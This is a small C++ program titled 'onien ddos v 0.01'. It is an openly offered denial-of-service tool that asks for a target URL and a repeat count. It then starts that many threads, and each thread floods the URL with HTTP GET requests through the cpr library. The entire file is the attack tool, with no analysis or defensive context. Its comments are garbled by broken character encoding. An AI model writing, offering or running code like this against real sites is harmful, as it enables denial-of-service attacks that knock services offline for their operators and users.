#include <cpr/cpr.h> //��������
#include<thread>

#include <Windows.h>
#include <iostream>
#include <string> //��� ������ �� ��������
#include <stdio.h>
#include <ppltasks.h>

using namespace std;
using namespace cpr;

vector<thread> threads;


void request(string url) {
	auto response = Get(Url{ url });
	cout << "yes!" << endl;
}

void ddosRequests(int retrys, string url) {
	long int iter = 0;
	for (iter; iter <= retrys; iter++) { //���-�� ����������
		request(url);
	}
}

int main() {

	setlocale(LC_ALL, "Russian");

	int retryes; //�������

	string urlDdos; //url �����

	cout << "onien ddos v 0.01" << endl;

	//����������� ���-�� ����������

	cout << "���-�� ����������: ";
	cin >> retryes;

	//����������� url

	cout << "Url �����: ";
	cin >> urlDdos;

	for (int iters = 0; iters <= retryes; iters++) {
		threads.emplace_back(ddosRequests, ref(retryes), ref(urlDdos));
	}
	for (auto& thr : threads) {
		thr.join();
	}
}